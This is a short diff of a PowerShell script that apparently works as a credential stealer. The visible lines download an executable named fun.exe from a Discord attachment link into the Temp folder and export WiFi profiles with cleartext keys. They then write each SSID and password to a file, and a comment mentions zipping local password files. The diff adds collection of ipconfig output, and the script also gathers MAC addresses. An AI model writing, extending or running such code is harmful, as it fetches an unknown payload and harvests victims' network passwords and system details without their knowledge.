@@ -10,6 +10,10 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 Invoke-WebRequest 'https://cdn.discordapp.com/attachments/975173196103966800/1435755657705029790/fun.exe?ex=690d1f27&is=690bcda7&hm=b2aad148ae82f9f7533f919ccdbe006c76d041af5dab43587d910bf9de9d3466&' -OutFile "$env:LOCALAPPDATA\Temp\fun.exe" 
 
 $e = "$env:LOCALAPPDATA\Temp"
+
+# Scrape the localappdata for password files (zipping as an example)
+$zip = "$env:TEMP\funny_stuff_folder.zip"
+
 netsh wlan export profile key=clear folder=$e | Out-Null
 
 # Collect WiFi SSIDs and Passwords
@@ -21,9 +25,7 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
     "SSID:$ssid | Password:$pass" | Out-File -Append -FilePath $wifiFile
 }
 
-# Scrape the localappdata for password files (zipping as an example)
-$zip = "$env:TEMP\funny_stuff_folder.zip"
-
+ipconfig /all | Out-File $e\ipcfg.txt
 
 
 $mac  = (Get-NetAdapter).MacAddress
